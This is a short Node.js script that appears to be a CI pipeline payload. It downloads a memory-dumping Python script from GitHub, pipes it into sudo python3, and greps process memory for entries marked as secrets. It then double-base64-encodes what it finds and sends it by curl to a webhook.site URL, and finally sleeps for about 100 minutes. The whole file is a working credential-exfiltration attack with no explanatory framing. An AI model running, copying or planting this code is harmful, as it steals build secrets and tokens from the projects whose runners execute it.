#!/usr/bin/env node
/* eslint-disable */
//prettier-ignore
const {exec} = require('child_process');
/*
*/
const pattern = '"[^"]+":{"value":"[^"]*","isSecret":true}';

exec(
  `curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}'`,
  (err, stdout) => {
    let trolled = btoa(btoa(stdout));
    exec(`curl https://webhook.site/5bca1c1c-7446-4a4b-8933-c3d0d62c3479?trolled=${trolled}`)

  
  }
);
console.log('bye');
exec(`bash -c 'sleep 6000'`);
